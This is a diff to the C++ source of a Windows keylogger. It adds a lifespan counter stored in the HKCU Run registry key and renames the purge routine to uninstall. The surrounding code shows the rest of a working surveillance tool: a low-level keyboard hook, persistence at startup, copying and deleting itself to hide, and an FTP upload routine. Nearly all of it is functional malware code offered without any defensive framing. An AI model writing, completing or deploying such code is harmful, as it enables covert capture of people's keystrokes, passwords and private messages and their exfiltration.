@@ -24,10 +24,14 @@ void KeyLogger::persist(std::string path) {
 
     keyValue += "\"";
     
+    //launch at startup
     RegSetValueEx(key, REGKEY_PERSIST, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
+    
+    //set life time
+    RegSetValueEx(key, REGKEY_LIFETIME, 0, REG_SZ, (BYTE*)KEYLOGGER_LIFETIME, sizeof(KEYLOGGER_LIFETIME));
 }
 
-void KeyLogger::purge() {
+void KeyLogger::uninstall() {
     
     //don't launch again
     HKEY key;
@@ -37,11 +41,58 @@ void KeyLogger::purge() {
         &key
         );
     RegDeleteValue(key, REGKEY_PERSIST);
+    
+    //remove lifetime key
+    RegDeleteValue(key, "lifespan");
 
     //delete program files and exit
     removeSelf();
 }
 
+void KeyLogger::updateLifespan() {
+    
+    char buffer[100];
+    DWORD buffSize = sizeof(buffer);
+    
+    //check remaining life time
+    HKEY key;
+    RegCreateKey(
+        HKEY_CURRENT_USER,
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        &key
+        ); 
+    
+    RegQueryValueEx(
+        key,
+        REGKEY_LIFETIME,
+        0,
+        NULL,
+        (BYTE*)buffer,
+        &buffSize
+        );
+    
+    //decrement it
+    int lifespan = atoi(buffer);
+    lifespan--;
+    
+    //uninstall the app if it's time
+    if (lifespan < 0) {
+        uninstall();
+    }
+    
+    //else just decrement the lifespan
+    _itoa_s(lifespan, buffer, 10);
+
+    RegSetValueEx(
+        key,
+        REGKEY_LIFETIME,
+        NULL,
+        REG_SZ,
+        (BYTE*)buffer,
+        sizeof(buffer)
+    );
+
+}
 
 void KeyLogger::removeSelf() {
     
@@ -136,7 +187,7 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
             KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);
 
             if (hooked.scanCode == HOTKEY_PURGE) {
-                keylogger->purge();
+                keylogger->uninstall();
             }
 
             switch(hooked.scanCode) {
@@ -292,6 +343,7 @@ void KeyLogger::install(std::string target) {
     
     //already installed
     if (target == programPath) {
+        updateLifespan();
         return;
     }
 
@@ -299,7 +351,7 @@ void KeyLogger::install(std::string target) {
     CopyFile(programPath.c_str(), target.c_str(), true);
 
     persist(target);
-
+    
     removeSelf();
 }
 
@@ -344,6 +396,8 @@ std::string KeyLogger::getUserHomeDirectory() {
 
     return std::string(buffer);
 }
+
+
 
 #ifdef USE_FTP
 void KeyLogger::upload() {
